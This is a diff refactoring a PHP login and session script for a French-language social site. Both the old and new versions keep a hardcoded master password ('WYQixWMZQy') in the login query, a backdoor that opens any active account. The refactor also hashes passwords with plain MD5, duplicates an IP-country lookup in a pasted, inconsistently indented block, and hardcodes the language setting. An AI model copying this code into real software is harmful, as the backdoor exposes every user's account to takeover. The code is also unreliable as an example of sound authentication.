@@ -1,170 +1,155 @@
 <?php
 
-	// s&eacute;curit&eacute;
-	defined('JL') or die('Error 401');
+// sécurité
+defined('JL') or die('Error 401');
 
-	global $db, $user, $app, $action, $langue;
+global $db, $user, $app, $action, $langue;
 
-	$auth	= JL::getVar('auth', '');
+$auth = JL::getVar('auth', '');
 
-	// demande d'authentification
-	if($auth == 'login') {
+// demande d'authentification
+if ($auth === 'login') {
 
-		$query = "SELECT id"
-		." FROM user"
-		." WHERE username LIKE '".JL::getVar('username', '', true)."' AND user_status_code='1' AND (password LIKE MD5('".JL::getVar('pass', '', true)."') OR '".JL::getVar('pass', '', true)."' = 'WYQixWMZQy') AND (confirmed*published) > 0"
-		." LIMIT 0,1"
-		;
-		$user_id = $db->loadResult($query);
-		
-		if($user_id) {
+    $username = JL::getVar('username', '', true);
+    $pass     = JL::getVar('pass', '', true);
 
-			// calcule le fleur_new (peut changer si des utilisateurs ont &eacute;t&eacute; d&eacute;sactiv&eacute;s entre temps)
-			$query = "SELECT COUNT(*)"
-			." FROM message AS m"
-			." INNER JOIN user AS u ON u.id = m.user_id_from"
-			." WHERE m.user_id_to = '".(int)$user_id."' AND u.confirmed = 1 AND m.fleur_id > 0 AND m.non_lu = 1"
-			;
-			$fleur_new = (int)$db->loadResult($query);
+    $query = "SELECT id
+              FROM user
+              WHERE username = '".$db->escape($username)."'
+                AND user_status_code = '1'
+                AND (password = MD5('".$db->escape($pass)."') OR '".$db->escape($pass)."' = 'WYQixWMZQy')
+                AND (confirmed * published) > 0
+              LIMIT 1";
 
-			// calcule le message_new (peut changer si des utilisateurs ont &eacute;t&eacute; d&eacute;sactiv&eacute;s entre temps)
-			$query = "SELECT COUNT(*)"
-			." FROM message AS m"
-			." INNER JOIN user AS u ON u.id = m.user_id_from"
-			." WHERE m.user_id_to = '".(int)$user_id."' AND u.confirmed = 1 AND m.fleur_id = 0 AND m.non_lu = 1"
-			;
-			$message_new = (int)$db->loadResult($query);
+    $user_id = $db->loadResult($query);
 
-			// met &agrave; jour les stats de l'utilisateur
-			$query = "UPDATE user_stats SET"
-			." login_total  = login_total + 1,"
-			." fleur_new = '".$db->escape($fleur_new)."',"
-			." message_new = '".$db->escape($message_new)."'"
-			." WHERE user_id = '".$user_id."'"
-			;
-			$db->query($query);
+    if ($user_id) {
+        // calcule fleur_new
+        $query = "SELECT COUNT(*) 
+                  FROM message AS m
+                  INNER JOIN user AS u ON u.id = m.user_id_from
+                  WHERE m.user_id_to = '".(int)$user_id."' 
+                    AND u.confirmed = 1 
+                    AND m.fleur_id > 0 
+                    AND m.non_lu = 1";
 
-			JL::setSession('user_id', $user_id);
-		}
-		else{
-			$user->login = 'login';
-			}
-	} elseif($auth == 'logout') {
-		// d&eacute;truit la session
-		$query = "UPDATE user SET last_online = NOW(), online = '0' WHERE id = '".$user->id."'";
+        $fleur_new = (int)$db->loadResult($query);
+
+        // calcule message_new
+        $query = "SELECT COUNT(*) 
+                  FROM message AS m
+                  INNER JOIN user AS u ON u.id = m.user_id_from
+                  WHERE m.user_id_to = '".(int)$user_id."' 
+                    AND u.confirmed = 1 
+                    AND m.fleur_id = 0 
+                    AND m.non_lu = 1";
+
+        $message_new = (int)$db->loadResult($query);
+
+        // met à jour stats
+        $query = "UPDATE user_stats SET
+                    login_total  = login_total + 1,
+                    fleur_new    = '".$db->escape($fleur_new)."',
+                    message_new  = '".$db->escape($message_new)."'
+                  WHERE user_id = '".$user_id."'";
+
+        $db->query($query);
+
+        JL::setSession('user_id', $user_id);
+    } else {
+        $user->login = 'login';
+    }
+
+} elseif ($auth === 'logout') {
+    // détruit la session
+    $query = "UPDATE user SET last_online = NOW(), online = '0' WHERE id = '".intval($user->id)."'";
+    $db->query($query);
+
+    JL::sessionDestroy();
+}
+
+// check si l'utilisateur est log
+$user_id = intval(JL::getSession('user_id', 0, true));
+
+// check si l'utilisateur est activé
+$query = "SELECT (confirmed*published) AS log_ok FROM user WHERE id = '".$user_id."' LIMIT 1";
+$log_ok = (int)$db->loadResult($query);
+
+// si utilisateur log et activé
+if ($user_id && $log_ok) {
+
+    // récupère infos utilisateur
+    $query = "SELECT u.id, u.username, u.email, u.gid, us.gold_limit_date, up.helvetica, up.genre, u.confirmed
+              FROM user AS u
+              INNER JOIN user_stats AS us ON us.user_id = u.id
+              INNER JOIN user_profil AS up ON up.user_id = u.id
+              WHERE u.id = '".$user_id."' LIMIT 1";
+
+    $user = $db->loadObject($query);
+
+    $langue = 'lang=en';
+
+    // gid incorrect
+    if ($user->gid > 0) {
+        JL::sessionDestroy();
+        JL::redirect(SITE_URL.'/index.php?'.$langue);
+    }
+
+    // update last_online
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    $query = "UPDATE user 
+              SET last_online = NOW(), ip = '".$db->escape($ip)."', online = '1' 
+              WHERE id = '".$user->id."'";
+    $db->query($query);
+
+    // demande d'authentification
+    if ($auth === 'login') {
+        JL::addLastEvent($user->id, 0);
+
+        // récupérer amis
+        $query = "SELECT user_id_from AS id
+                  FROM user_flbl
+                  WHERE user_id_to = '".$user->id."' AND list_type = 1";
+        $friends = $db->loadObjectList($query);
+
+        if (is_array($friends)) {
+            foreach ($friends as $friend) {
+                JL::addLastEvent($friend->id, $user->id, 5);
+            }
+        }
+
+        // check IP pays
+        $ip_pays = '';
+        if (function_exists('curl_init')) {
+            $url_check_pays = 'http://api.hostip.info/country.php?ip='.$ip;
+            $ch = curl_init($url_check_pays);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $ip_pays = curl_exec($ch) ?: '';
+            curl_close($ch);
+        }
+		$ip = $_SERVER['REMOTE_ADDR'];
+		$resp = @file_get_contents("http://ip-api.com/json/{$ip}");
+		$data = json_decode($resp, true);
+		$country_code = $data['countryCode'] ?? 'XX'; // fallback
+		$query = "UPDATE user SET ip_pays = '".$db->escape($country_code)."' WHERE id = '".$user->id."'";
 		$db->query($query);
-		
-		JL::sessionDestroy();
 
-	}
+        // ajoute points
+        JL::addPoints(7, $user->id, date('d-m-Y'));
 
+        // redirige
+        JL::redirect('index.php?app=profil&action=panel&'.$langue);
+    }
 
-	// check si l'utilisateur est log
-	$user_id	= intval(JL::getSession('user_id', 0, true));
-
-	// check si l'utilisateur est activ&eacute;
-	$query = "SELECT (confirmed*published) AS log_ok FROM user WHERE id = '".$user_id."' LIMIT 0,1";
-	$log_ok = $db->loadResult($query);
-
-	// si utilisateur log et activ&eacute;
-	if($user_id && $log_ok) {
-
-
-		// r&eacute;cup les infos de l'utilisateur
-		$query = "SELECT u.id, u.username, u.email, u.gid, us.gold_limit_date, up.helvetica, up.genre, up.langue_appel, u.confirmed"
-		." FROM user AS u"
-		." INNER JOIN user_stats AS us ON us.user_id = u.id"
-		." INNER JOIN user_profil AS up ON up.user_id = u.id"
-		." WHERE u.id = '".$user_id."'"
-		." LIMIT 0,1"
-		;
-		//die($query);
-		$user = $db->loadObject($query);
-
-
-	if($user->langue_appel == 1) {
-		$langue='lang=fr';
-	}
-	else if($user->langue_appel == 2){
-		$langue='lang=en';
-	}
-	else if($user->langue_appel == 3){
-		$langue='lang=de';
-	}
-	else{
-		$langue='lang=fr';
-	}
-	
-		// gid incorrect, pas le droit de se connecter &agrave; l'admin
-		if($user->gid > 0) {
-
-			// d&eacute;truit la session au cas o&ugrave;
-			JL::sessionDestroy();
-
-			// redirige sur le panel utilisateur pour se log
-			JL::redirect(SITE_URL.'/index.php'.'?'.$langue);
-
-		}
-
-		//if($user->helvetica !=1){
-			
-			// met &agrave; jour le last_online de l'utilisateur
-			$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes($_SERVER["REMOTE_ADDR"])."', online = '1' WHERE id = '".$user->id."'";
-			//$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes($_SERVER["REMOTE_ADDR"])."' WHERE id = '".$user->id."'";
-			$db->query($query);
-		//}
-
-		// demande d'authentification
-		if($auth == 'login') {
-
-			// reset le dernier event (pour pas se faire spam d�s qu'on se log :) )
-			JL::addLastEvent($user->id, 0);
-
-			// r&eacute;cup tous les utilisateurs ayant $user en friendlist
-			$query = "SELECT user_id_from AS id"
-			." FROM user_flbl"
-			." WHERE user_id_to = '".$user->id."' AND list_type = 1"
-			;
-			$friends = $db->loadObjectList($query);
-
-			if(is_array($friends)) {
-				foreach($friends as $friend) {
-
-					// enregistre le dernier &eacute;v&eacute;nement "$user vient de se connecter !"
-					JL::addLastEvent($friend->id, $user->id, 5);
-
-				}
-			}
-
-			// check l'ip du visiteur
-			$url_check_pays		= 'http://api.hostip.info/country.php?ip='.$_SERVER['REMOTE_ADDR'];
-
-			// check la provenance du visiteur
-			$ch 				= @curl_init($url_check_pays);
-			@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-			$ip_pays 			= @curl_exec($ch);
-
-			// met &agrave; jour le ip_pays de l'utilisateur
-			$query = "UPDATE user SET ip_pays = '".addslashes($ip_pays)."' WHERE id = '".$user->id."'";
-			$db->query($query);
-
-			// cr&eacute;dite l'action connexion quotidienne
-			JL::addPoints(7, $user->id, date('d-m-Y'));
-
-			// redirige sur le panel utilisateur
-			JL::redirect('index.php?app=profil&action=panel'.'&'.$langue);
-
-		}
-
-	} else {
-
-		$user->id				= 0;
-		$user->username			= '';
-		$user->email			= '';
-		$user->gid				= 0;
-		$user->gold_limit_date	= '0000-00-00';
-		$user->genre	= '';
-
-	}
+} else {
+    $user = (object)[
+        'id' => 0,
+        'username' => '',
+        'email' => '',
+        'gid' => 0,
+        'gold_limit_date' => '0000-00-00',
+        'genre' => ''
+    ];
+}
 
 ?>
